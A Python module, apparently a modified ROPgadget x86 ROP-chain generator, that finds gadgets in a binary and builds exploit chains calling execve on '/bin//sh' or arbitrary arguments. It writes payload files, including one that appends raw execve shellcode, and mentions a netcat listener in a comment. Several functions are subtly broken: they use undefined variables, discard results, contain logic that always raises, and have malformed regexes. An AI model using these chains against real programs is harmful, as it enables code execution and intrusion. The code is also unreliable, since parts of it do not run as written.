#!/usr/bin/env python3
## -*- coding: utf-8 -*-
##
##  Jonathan Salwan - 2014-05-13
##
##  http://shell-storm.org
##  http://twitter.com/JonathanSalwan
##

import re
from struct import pack
from ropgadget.ropchain.NullHandler import NullHandler as nh
from collections import defaultdict


class ROPMakerX86(object):
    def __init__(self, binary, gadgets, padding, execve, liboffset=0x0):
        self.__binary  = binary
        self.__gadgets = gadgets

        # If it's a library, we have the option to add an offset to the addresses
        self.__liboffset = liboffset
        self.padding = padding

        self.__execve = execve          ### MODIFIED
        self.__WORD_SIZE = 4            ### MODIFIED

        self.__generate()


    def __pops(self):

        outputdict = {}

        for reg in ["eax","ebx","ecx","edx","esi","edi"]:
            tmp = self.__lookingForSomeThing("pop %s" % reg)
            if tmp:
                outputdict[reg] = tmp

        return outputdict

    def __pushs(self):

        outputdict = {}

        for reg in ["eax","ebx","ecx","edx","esi","edi"]:
            tmp = self.__lookingForSomeThing("push %s" % reg)
            if tmp:
                outputdict[reg] = tmp

        return outputdict

    def __lookingPossiableDoubles(self):

        outputdict = defaultdict(lambda : None)
        for gadget in self.__gadgets:

            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search("add (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]

                try:
                    if(regex.group("dst") != regex.group("src")):
                        raise

                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    
                        raise

                    outputdict[regex.group("src")] = gadget
                except:
                    continue

        return outputdict

    def __lookingPossiableMoves(self):

        outputdict = {}
        for gadget in self.__gadgets:

            f = gadget["gadget"].split(" ; ")[0]
            regex = re.search("mov (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]

                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    
                    if(regex.group("dst") == regex.group("src")):
                        raise

                    outputdict[(regex.group("dst"), regex.group("src"))] = gadget
                except:
                    continue

        return outputdict

    def __lookingForMasks(self, regdst, regsrc, possiablemasks, possiablemovs, possiablepops,possiabledoubles):

        bestmaskchain= None

        def setbestmaskchain(bestmaskchain,maskchaingroup):

            if(bestmaskchain is None):
                return maskchaingroup

            if(maskchaingroup[3]):
                if(not bestmaskchain[3] or len(maskchaingroup[0]) < len(bestmaskchain[0])):
                    return maskchaingroup
            else:
                if(len(maskchaingroup[0]) < len(bestmaskchain[0]) and not bestmaskchain[3]):
                    return maskchaingroup

            return bestmaskchain

        for regsrc2 in ["eax","ebx","ecx","edx","esi","edi"]:
            double = possiabledoubles[regdst] or possiabledoubles[regsrc2]
            if ((regdst,regsrc2) in possiablemasks and regsrc2 in possiablepops):
                if(regsrc == regsrc2):
                    mask,method,weight = possiablemasks[(regdst,regsrc2)]
                    maskchaingroup = ([mask],regsrc2,(0,method,weight),double)
                    bestmaskchain = setbestmaskchain(bestmaskchain,maskchaingroup)
                else:
                    mask,method,weight = possiablemasks[(regdst,regsrc2)]
                    maskchaingroup = ([possiablepops[regsrc2],mask],regsrc2,(1,method,weight),double)
                    bestmaskchain = setbestmaskchain(bestmaskchain,maskchaingroup)

            for regdst2 in ["eax","ebx","ecx","edx","esi","edi"]:
                if ((regdst2,regsrc2) in possiablemasks and regsrc2 in possiablepops):

                    if(regsrc != regsrc2 and regsrc != regdst2):
                        if((regdst,regdst2) in possiablemovs):
                            double = double or possiabledoubles[regdst2]
                            mask,method,weight = possiablemasks[(regdst2,regsrc2)]
                            mov = possiablemovs[(regdst,regdst2)]
                            maskchaingroup = ([possiablepops[regsrc2],mask,mov],regsrc2,(1,method,weight),double)
                            setbestmaskchain(bestmaskchain,maskchaingroup)


        return bestmaskchain


    def __lookingPossiableMask(self):

        outputdict = {}
        weight = 0
        for mask in ["xor","add","sub"]: 
            for gadget in self.__gadgets:

                f = gadget["gadget"].split(" ; ")[0]
                regex = re.search(mask + " (?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3})), (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)|(0x+)]{3}))$", f)
                if regex:

                    #print("BEFORE GADGET SPLIT: ", gadget["gadget"].split(" ; "))
                    lg = gadget["gadget"].split(" ; ")[1:]
                    

                    try:
                        for g in lg:
                            if g.split()[0] != "pop" and g.split()[0] != "ret":
                                raise
                            # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                            if g != "ret":
                                if g.split()[0] == "ret" and g.split()[1] != "":
                                    raise
                        
                        if(regex.group("dst") == regex.group("src")):
                            raise

                        outputdict[(regex.group("dst"), regex.group("src"))] = (gadget,mask,weight)
                    except:
                        continue

            weight = weight + 1

        outputdict = {}
        for mask in ["inc","dec"]: 
            for reg in ["eax","ebx","ecx","edx","esi","edi"]:
                tmp = self.__lookingForSomeThing(mask + " %s" % reg)
                if tmp:
                    outputdict[(reg,reg)] = (tmp,mask,weight)

            weight = weight + 1

        return outputdict

    def __lookingForWrite4Where(self, gadgetsAlreadyTested):

        for gadget in self.__gadgets:
            if gadget in gadgetsAlreadyTested:
                continue
            f = gadget["gadget"].split(" ; ")[0]
            # regex -> mov dword ptr [r32], r32
            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
            if regex:
                lg = gadget["gadget"].split(" ; ")[1:]
                try:
                    for g in lg:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise

                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return [gadget,regex.group("dst"), regex.group("src")]
                except:
                    continue
        return None

    def __lookingForSomeThing(self, something):
        for gadget in self.__gadgets:
            lg = gadget["gadget"].split(" ; ")
            if lg[0] == something:
                try:
                    for g in lg[1:]:
                        if g.split()[0] != "pop" and g.split()[0] != "ret":
                            raise
                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
                        if g != "ret":
                            if g.split()[0] == "ret" and g.split()[1] != "":
                                raise
                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
                    return gadget
                except:
                    continue
        return None

    def __padding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    print("\tp += pack('<I', 0x%08x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                except KeyError:
                    print("\tp += pack('<I', 0x41414141) # padding")

    def __custompadding(self, gadget, regAlreadSetted):
        lg = gadget["gadget"].split(" ; ")
        p = b''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    p += pack('<I', regAlreadSetted[reg])
                except KeyError:
                    p += pack('<I', 0x41414141)
        return p 

    def putvalueReg(self,value,regpop,maskchain,otherregs):

        p += pack('<I', regpop["vaddr"]) 
        p += pack('<I', value) 
        p += self.__custompadding(regpop, otherregs)  


    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        print("#!/usr/bin/env python3")
        print("# execve generated by ROPgadget\n")
        print("from struct import pack\n")

        print("# Padding goes here")
        print("p = b''\n")

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'/bin'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 4" % (dataAddr + 4))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (popSrc["vaddr"], popSrc["gadget"]))
        print("p += b'//sh'")
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr + 4})  # Don't overwrite reg dst
        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popDst["vaddr"], popDst["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popDst, {})

        print("p += pack('<I', 0x%08x) # %s" % (xorSrc["vaddr"], xorSrc["gadget"]))
        self.__padding(xorSrc, {})

        print("p += pack('<I', 0x%08x) # %s" % (write4where["vaddr"], write4where["gadget"]))
        self.__padding(write4where, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEbx["vaddr"], popEbx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data" % dataAddr)
        self.__padding(popEbx, {})

        print("p += pack('<I', 0x%08x) # %s" % (popEcx["vaddr"], popEcx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEcx, {"ebx": dataAddr})  # Don't overwrite ebx

        print("p += pack('<I', 0x%08x) # %s" % (popEdx["vaddr"], popEdx["gadget"]))
        print("p += pack('<I', 0x%08x) # @ .data + 8" % (dataAddr + 8))
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (xorEax["vaddr"], xorEax["gadget"]))
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx
        
        for _ in range(11):
            print("p += pack('<I', 0x%08x) # %s" % (incEax["vaddr"], incEax["gadget"]))
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8})  # Don't overwrite ebx and ecx

        print("p += pack('<I', 0x%08x) # %s" % (syscall["vaddr"], syscall["gadget"]))


    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        #p = b'A' * self.padding
        p = b'A' * 44
        
        #args = [b'/bin/nc', b'-lvp', b'6666']
        
        #foo = ["/bin/nc","-lvp","6666"]
        #foo = ["/usr/bin/python3", "ROPgadget/ROPgadget.py", "--binary", "vuln3-32", "--ropchain"]
        #print(self.PreProcessArgs(foo))

        #args = self.PreProcessArgs(foo) # foo = 
        print(self.__execve)

        stack = dataAddr
        #-----------------------------stack--------------------------

        for i in range(len(self.__execve)):
            arg = self.__execve[i]
            chunk = len(arg) // 4        
            for j in range(chunk): 
                
                p += pack('<I', popDst["vaddr"]) 
                p += pack('<I', stack) 
                p += self.__custompadding(popDst, {})

                p += pack('<I', popSrc["vaddr"]) 
                p += arg[j*4:j*4+4] 
                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst

                p += pack('<I', write4where["vaddr"]) 
                p += self.__custompadding(write4where, {}) 
                
                stack = stack + 4

                #arg each in 4 chunk

            lastWord = arg[len(arg)-4: len(arg)]                          # The last 4 bytes of the current argument
            locationForNULL = stack                                             # We place the null right at the top of the stack

            if (b'\x07' in lastWord):
                locationForNULL = stack - (4 - lastWord.index(b'\x07'))         # Write a NULL at the end of the argument

            p += pack('<I', popDst["vaddr"]) 
            p += pack('<I', locationForNULL)
            p += self.__custompadding(popDst, {})

            p += pack('<I', xorSrc["vaddr"]) 
            p += self.__custompadding(xorSrc, {})

            p += pack('<I', write4where["vaddr"]) 
            p += self.__custompadding(write4where, {})
            stack = stack + 1

            #adding null

        argindex = 0
        safestack = stack

        #----------------------------------args/__execve---------------------------------

        for arg in self.__execve:

            p += pack('<I', popDst["vaddr"]) 
            p += pack('<I', stack) 
            p += self.__custompadding(popDst, {})

            p += pack('<I', popSrc["vaddr"]) 
            p += pack('<I', dataAddr + argindex) 
            p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst

            p += pack('<I', write4where["vaddr"]) 
            p += self.__custompadding(write4where, {})        

            stack = stack + 4
            argindex = argindex + len(arg) + 1 

            #writes arg on shadowstack
        
        p += pack('<I', popDst["vaddr"]) 
        p += pack('<I', stack) 
        p += self.__custompadding(popDst, {})

        p += pack('<I', xorSrc["vaddr"]) 
        p += self.__custompadding(xorSrc, {})

        p += pack('<I', write4where["vaddr"]) 
        p += self.__custompadding(write4where, {})

        #adding null

        p += pack('<I', popEbx["vaddr"]) 
        p += pack('<I', dataAddr) 
        p += self.__custompadding(popEbx, {})

        #puts stack in to ebx (program)

        p += pack('<I', popEcx["vaddr"]) 
        p += pack('<I', safestack) 
        p += self.__custompadding(popEcx, {"ebx": dataAddr})  

        #puts stack + 60 in to ecx (args)

        p += pack('<I', popEdx["vaddr"]) 
        p += pack('<I', stack) 
        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  

        #puts stack in to edx (env)

        p += pack('<I', xorEax["vaddr"]) 
        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": safestack})  

        for _ in range(11):
            p += pack('<I', incEax["vaddr"]) 
            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": safestack})  # Don't overwrite ebx and ecx

        #sets eax to 11

        p += pack('<I', syscall["vaddr"]) 

        #runs systemcall

        outputfile = open("paddingbruteforce", "wb")
        outputfile.write(p)
        outputfile.close()


    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        sects = self.__binary.getDataSections()
        dataAddr = None
        for s in sects:
            if s["name"] == ".data":
                dataAddr = s["vaddr"] + self.__liboffset
        if dataAddr is None:
            print("\n[-] Error - Can't find a writable section")
            return

        #p = b'A' * self.padding
        p = b'\x41' * 44
        #p += b'BBBB'
        
        stack = dataAddr
        print("STACK ADDRESS IS: {:08x}".format(stack))#stack.to_bytes(4, byteorder="big"))

        ###############

        loc_of_shellcode = stack + (4*(11 + 2*125 + 1))
        #byte_loc_of_shellcode = loc_of_shellcode.to_bytes(4, byteorder="big")

        #print(byte_loc_of_shellcode)

        # puts start address in to ebx 
        
        p += pack('<I', popEbx["vaddr"]) 
        p += pack('<4s', loc_of_shellcode)#self.CCMA(byte_loc_of_shellcode, {}, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall))       # start address of the 
        p += self.__custompadding(popEbx, {})

        #puts stack in to ebx (program)
        
        
        p += pack('<I', popEcx["vaddr"]) 
        p += pack('<I', 0xFFFFFFFF)#0x00000030)#48)#popEcx["vaddr"]) 
        #print("CHECK FINAL:", p)
        p += self.__custompadding(popEcx, {"ebx": loc_of_shellcode})  
        

        #for _ in range(48):
        #    p += pack('<I', incEax["vaddr"])
        #    p += self.__custompadding(incEax, FFFF)

        #puts stack + 60 in to ecx (args)

        p += pack('<I', popEdx["vaddr"]) 
        p += pack('<I', 0xFFFFFFFF)#)00000004)#4) 
        p += self.__custompadding(popEdx, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  

        #puts stack in to edx (env)

        p += pack('<I', xorEax["vaddr"]) 
        p += self.__custompadding(xorEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  

        for _ in range(10):
            p += pack('<I', incEax["vaddr"]) 
            p += self.__custompadding(incEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  # Don't overwrite ebx and ecx

        #sets eax to 125

        p += pack('<I', syscall["vaddr"]) 

        # Call syscall

        p += pack('<I', 0x31c05068) 
        p += pack('<I', 0x2f2f7368)

        p += pack('<I', 0x682f6269)
        p += pack('<I', 0x6e89e350)

        p += pack('<I', 0x5389e199)
        p += pack('<I', 0xb00bcd80)

        # 31 c0 50 68
        # 2f 2f 73 68
        # 68 2f 62 69
        # 6e 89 e3 50
        # 53 89 e1 99
        # b0 0b cd 80

        #print("ROP CHAIN:", p)

        file = open("shellcode_ROP", "wb")
        file.write(p)
        file.close()



    # Creates the first part of the mask
    def CM(self, addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
        # Creates a stack of this shape
        
        ##### POP SRC #####
        ### Masked_addr ###
        ##### POP DST #####
        ####### Mask ######
        ### XOR SRC/DST ###
    
        # Get mask and masked address
        mask, masked_addr = nh().CreateMask(addr)

        int_masked_addr = int.from_bytes(masked_addr, byteorder="big")
        print("The mask is {0:8x}, and the masked addr is {1:8x}.".format(mask, masked_addr))

        b =  pack("<I", popSrc["vaddr"])
        b += pack("<I", int_masked_addr)#" + str(self.__WORD_SIZE) + "s", masked_addr )
        b += self.__custompadding(popSrc, regAlreadSetted )        # merge any previous regs with the current one that's just been popped
        
        b += pack("<I", popDst["vaddr"])
        b += pack("<" + str(self.__WORD_SIZE) + "s", mask )
        b += self.__custompadding(popDst, regAlreadSetted | { popSrc["gadget"].split()[1]: int_masked_addr })
        
        # b += pack("<I", xorSrcDst)      # XOR PACK
        # Add padding for XOR

        return b

    # (C)heck and (C)reate (M)asked (A)ddress. Checks and creates an addr for nulls - if it contains a null then it creates a mask and outputs the ropchain associated with decoding it
    def CCMA(self, addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):#, xorSrcDst, pushSrc):
        # If the addr contains no NULLs then we just return
        if (not ( nh().contains_null(addr) ) ):
            return addr
        else:
            
            # We want to lay the stack out like so

            ##### POP SRC ##### -----
            ### Masked_addr ###     |
            ##### POP DST #####     |-- Created with `self.CM()`
            ####### Mask ######     |
            ### XOR SRC/DST ### -----
            ##### PUSH SRC #### 
            '''
            # Get mask and masked address
            mask, masked_addr = NullHandler

            print("POP GADGET: " + popSrc["gadget"])

            b =  pack("<I", popSrc["vaddr"])
            b += pack("<" + str(self.__WORD_SIZE) + "s", masked_addr )
            b += self.__custompadding(popSrc, regAlreadSetted )        # merge any previous regs with the current one that's just been popped
            
            b += pack("<I", popDst["vaddr"])
            b += pack("<" + str(self.__WORD_SIZE) + "s", mask )
            b += self.__custompadding(popDst, regAlreadSetted | popSrc["gadget"].split()[1])
            '''

            b = self.CM(addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
            
            # WE DON'T NEED TO SET redAlreadSetted to include SRC as the PUSH is only doing that
            # b += pack("<I", pushSrc)PUSH SRC                  # PUSH SRC
            # b += self__custompadding(PUSHSRC, regAlreadSetted)


            return b

    # Check and Create a Masked Values. Creates an ROP-Chain for Values to be pushed onto the stack and de-masked at runtime
    def CCMV(self, addr, regAlreadySetted, arb, stackPointer, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):

        if (not (nh().contains_null(addr))):
            return addr
        else:

            # We want to lay the stack out like so

            ##### POP SRC ##### -----
            ### Masked_addr ###     |
            ##### POP DST #####     |-- Created with `self.CM()`
            ####### Mask ######     |popSrc["gadget"].split()[1]
            ### XOR SRC/DST ### -----
            ##### POP DST #####
            ## *unMasked Val ## -----
            ### WRITE4WHERE ###     |   *unmasked Val is the pointer the to the location in memroy where we the ROPchain writes the unmasked value
            ###### ARB <> #####     |   ARB <>. This is some arbitrary gadget that pops the unMaskedValue off the stack
            #\\ UnMasked Val /# <----   This is written onto the stack so we can pop it into some register

            # Adds the top half of the unveilder onto the stack
            b = self.CM(addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)

            # Rembemer to add padding protection for SRC (protection for the previous XOR)
            b += pack("<I", popDst["vaddr"])
            ####### WARNING #######
            b += self.__custompadding(popDst, {})#{popSrc["gadget"].split()[1]: })  ## HIGH RISK - CURRENTLY NOT USING PADDING PROTECTION FOR SRC!!!!!!!!!!!!!
            ####### WARNING ####### 

            stackPointer = len(b)
            loc_of_unmaskedPointer = stackPointer
            unmaskedPointer = 0xFFFFFFFF       # Place holder so we can work out the exact address to point to

            b += pack("<I", unmaskedPointer)

            b += pack("<I", write4where["vaddr"])
            b += self.__custompadding(write4where, {})

            # Arbitrary gadget to execute with the unmasked addr on the stack

            b += pack("<I", arb["vaddr"])
            b += self.__custompadding(arb, {})

            # adds some dummy packing to allow this rop to write into this little spot
            b += pack("<I", 0x42424242)

            stackPointer = len(b)

            # Once we have the actual location of where we are going to write the unmasked value to the stack we need to go back and update the write4where location of this
            b = b[0:loc_of_unmaskedPointer] + pack("<I", stackPointer - self.__WORD_SIZE) + b[loc_of_unmaskedPointer + self.__WORD_SIZE: stackPointer]

            # We should have added an unveil in run time!!! (hopefully anyway)

            # Things to check for next time:
            #   - Padding is correct (for keeping certain registers the correct value)
            #   - run this through gdb when we have the gadgets avaliable
            
            return b

    # Encodes addresses that contains nulls                                                                                                     #       #          #        #        #
    def Double_and_Add(self, value, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, addSrc, addSrcDst, xorDst, incSrc):
        # Here we build up a value from 0 using the double-and-add algorithm, will require at most l^2 gadgets where l is the length of the word in bits

        ###############
        ### XOR SRC ###     zeros src and dst
        ### XOR DST ###
        ### INC SRC ###     sets src to 1
        ### ADD SRC ###     <-- start the double and add
        ### ADD S/D ###
        #     ...     #

        p = pack('<I', xorSrc["vaddr"])
        p += self.__custompadding(xorSrc, {})

        p += pack('<I', xorDst["vaddr"])
        p += self.__custompadding(xorDst, {})

        p += pack('<I', incSrc["vaddr"])
        p += self.__custompadding(incSrc, {})

        bits_little_endian = "{0:b}".format(value)[::-1]

        for i in range(bits_little_endian):
            # double
            b += pack('<I', addSrc["vaddr"])
            b += self.__custompadding(addSrc, {})

            # Do we need to add?
            if (bool(int(bits_little_endian[i]))):
                b += pack('<I', addSrcDst["vaddr"])
                b += self.__custompadding(addSrcDst, {})
        
        # At this point we have the number in dst



    def __generate(self):

        # To find the smaller gadget
        self.__gadgets.reverse()

        print("\nROP chain generation\n===========================================================")

        print("\n- Step 1 -- Write-what-where gadgets\n")

        gadgetsAlreadyTested = []
        possiablemasks = self.__lookingPossiableMask()
        for a in possiablemasks:
            print("Possible Mask Gadget: ", a)#["gadget"])
        print("POSSIBLE GADGET:", possiablemasks)
        possiabledoubles = self.__lookingPossiableDoubles()
        possiablemovs= self.__lookingPossiableMoves()
        possiablepops = self.__pops()
        possiablepushs = self.__pushs()
        storedgadget = [] 
        storedgadgetsAlreadyTested= [] 

        while True:
            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
            if not write4where:
                if(len(storedgadget) == 0):
                    print("\t[-] Can't find the 'mov dword ptr [r32], r32' gadget")
                    return
                write4where = storedgadget[0]
                popDst = storedgadget[1]
                popSrc = storedgadget[2]
                xorSrc = storedgadget[3]
                chainmask = storedgadget[4]
                storedgadget = storedgadgetsAlreadyTested
                break

            popDst = self.__lookingForSomeThing("pop %s" % write4where[1])
            if not popDst:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[1])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            popSrc = self.__lookingForSomeThing("pop %s" % write4where[2])
            if not popSrc:
                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[2])
                gadgetsAlreadyTested += [write4where[0]]
                continue

            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
            if not xorSrc:
                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (write4where[2], write4where[2]))
                gadgetsAlreadyTested += [write4where[0]]
                continue

            #getting second source
            chainmask = self.__lookingForMasks(write4where[1], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
            
            if(not chainmask):
                print("\t[-] Can't find the 'mask chain' gadget. Try with another 'mov [r], r'\n")
                gadgetsAlreadyTested += [write4where[0]]
                continue

            if(len(storedgadget) != 0):
                if(storedgadget[4][2][2] == 0):

                    print("\t[-] found a worst vaild comb'\n")
                    gadgetsAlreadyTested += [write4where[0]]
                    continue

                if(storedgadget[4][3]):
                    print("\t[-] found a worst vaild comb'\n")
                    gadgetsAlreadyTested += [write4where[0]]
                    continue
                    
                else:

                    if(storedgadget[4][2][2] > chainmask[2][2]):
                        print("\t[-] found a worst vaild comb'\n")
                        gadgetsAlreadyTested += [write4where[0]]
                        continue

                    else:
                        storedgadget = [write4where,popDst,popSrc,xorSrc,chainmask]
                        storedgadgetsAlreadyTested = gadgetsAlreadyTested

                        gadgetsAlreadyTested += [write4where[0]]

                        print("\t[-] found a vaild comb'\n")
                        continue
                        
            else:
                storedgadget = [write4where,popDst,popSrc,xorSrc,chainmask]
                storedgadgetsAlreadyTested = gadgetsAlreadyTested

                gadgetsAlreadyTested += [write4where[0]]

                print("\t[-] found a vaild comb'\n")
                continue
 
        
        print(chainmask)
        doubleandadd = chainmask[3]
        print("\n- Step 2 -- Init syscall number gadgets\n")

        xorEax = self.__lookingForSomeThing("xor eax, eax")
        if not xorEax:
            print("\t[-] Can't find the 'xor eax, eax' instruction")
            return

        incEax = self.__lookingForSomeThing("inc eax")
        if not incEax:
            print("\t[-] Can't find the 'inc eax' instruction")
            return

        print("\n- Step 3 -- Init syscall arguments gadgets\n")

        popEbx = self.__lookingForSomeThing("pop ebx")
        if not popEbx:
            print("\t[-] Can't find the 'pop ebx' instruction")
            return
        popEcx = self.__lookingForSomeThing("pop ecx")
        if not popEcx:
            print("\t[-] Can't find the 'pop ecx' instruction")
            return

        popEdx = self.__lookingForSomeThing("pop edx")
        if not popEdx:
            print("\t[-] Can't find the 'pop edx' instruction")
            return

        print("\n- Step 4 -- Syscall gadget\n")

        syscall = self.__lookingForSomeThing("int 0x80")
        if not syscall:
            print("\t[-] Can't find the 'syscall' instruction")
            return

        print("\n- Step 5 -- Build the ROP chain\n")

        #self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
        #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
        #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
    